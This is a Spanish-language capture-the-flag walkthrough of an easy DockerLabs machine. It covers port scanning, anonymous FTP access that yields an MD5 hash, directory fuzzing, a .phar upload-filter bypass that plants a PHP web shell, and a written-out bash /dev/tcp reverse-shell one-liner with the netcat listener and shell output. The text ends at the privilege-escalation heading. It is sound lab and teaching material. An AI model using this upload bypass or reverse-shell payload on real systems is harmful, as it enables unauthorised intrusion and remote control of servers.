Propiedades:
- OS: Linux
- Plataforma: DockerLabs
- Nivel: Easy
- Tags: #file-upload #dockerlabs #burpsuite

![](assets/Pasted%20image%2020251103001143.png)
## Reconocimiento

Empezamos con un escaneo con Nmap para listar todos los puertos abiertos:

```bash
> sudo nmap -p- --open -sS --min-rate 5000 -Pn -n 172.17.0.3 -oN ports.txt
---------------------------------------------------------------------------
PORT   STATE SERVICE
21/tcp open  ftp
80/tcp open  http
```

- Puertos 21 y 80 abiertos


Sobre los puertos abiertos realizo un segundo escaneo mas profundo para detectar servicios, versiones y correr un conjunto de scripts de reconocimiento.

```bash
> nmap -p 21,80 -sCV -Pn -n 172.17.0.3 -oN targeted.txt
--------------------------------------------------------
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:172.17.0.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-r--r--r--    1 65534    65534          33 Sep 12  2024 anon.txt
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Unix
```

- Puerto 21: vsftpd 3.0.5 que al parecer el Anonymous Login esta disponible
- Puerto 80 HTTP: Apache httpd 2.4.41




## Enumeración

### Puerto 21 FTP

Al conectarnos al servicio FTP con el usuario _anonymous_ al parecer lo que nos encontramos es un archivo llamdo _anon.txt_ que contiene una especie de hash

```bash
> ftp 172.17.0.3
> ls
229 Entering Extended Passive Mode (|||21219|)
150 Here comes the directory listing.
-r--r--r--    1 65534    65534          33 Sep 12  2024 anon.txt
> get anon.txt
> cat anon.txt
53dd9c6005f3cdfc5a69c5c07388016d
```

- El hash es un _md5_ con valor: _53dd9c6005f3cdfc5a69c5c07388016d:justin_

### Puerto 80 HTTP

Al parecer simplemente es la pagina default de apache

![](assets/Pasted%20image%2020251101214354.png)

**Fuzzing.**

Utilizo `gobuster` para descubrir posibles recursos ocultos en la web.

```bash
> gobuster dir -w /home/wndr/Tools/dictionaries/SecLists/Discovery/Web-Content/raft-medium-directories.txt -u http://172.17.0.3/ -x html,php,py,js,txt
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/uploads              (Status: 301) [Size: 310] [--> http://172.17.0.3/uploads/]
/index.html           (Status: 200) [Size: 11008]
/server-status        (Status: 403) [Size: 275]
/file_upload.php      (Status: 200) [Size: 468]
```

- /file_upload.php es una simple subida de archivos
- /uploads es el directorio donde se almacenan los archivos subidos.


## Explotación


El recurso **/file_upload.php** nos permite subir un archivo a la web y visualizarlo en el directorio **/uplaods.**


![](assets/Pasted%20image%2020251101220545.png)

Con BurpSuite Interceptamos la petición para ver que es lo se envié por detrás y para realizar un ataque **Sniper** para ver que extensiones permite esa subida de archivos:

![](assets/Pasted%20image%2020251101220710.png)

El resultado es que la subida de archivos permite los archivos  _.phar_ por lo cual ahora nos creamos una web-shell simple en php


![](assets/Pasted%20image%2020251101220837.png)

Subimos el archivo y nos dirigimos a la directorio **/uploads** para ver si nuestro archivo se subió correctamente

![](assets/Pasted%20image%2020251101221020.png)

- Efectivamente nuestro archivo ha sido subido

Nos dirigimos a la ruta de nuestro archivo para comprobar que si nos esta interpretando el script php

- Lanzamos el comando _whoami_

![](assets/Pasted%20image%2020251101221108.png)

Ahora que sabemos que si nos esta interpretando el script procedemos a ponernos en escucha por el puerto 443 para establecer una reverse shell:

```bash
> sudo nc -nlvp 443
```

Mandamos el siguiente one-liner para establecernos la reverse-shell.

```
http://172.17.0.3/uploads/webshell.phar?cmd=bash -c 'bash -i >%26 /dev/tcp/172.17.0.1/443 0>%261'
```

Tenemos acceso al sistema:

```bash
> sudo nc -nlvp 443
Listening on 0.0.0.0 443
Connection received on 172.17.0.3 55726
bash: cannot set terminal process group (11): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ef19d4897c3d:/var/www/html/uploads$ whoami
whoami
www-data
www-data@ef19d4897c3d:/var/www/html/uploads$ 
```

## Escalada de Privilegios
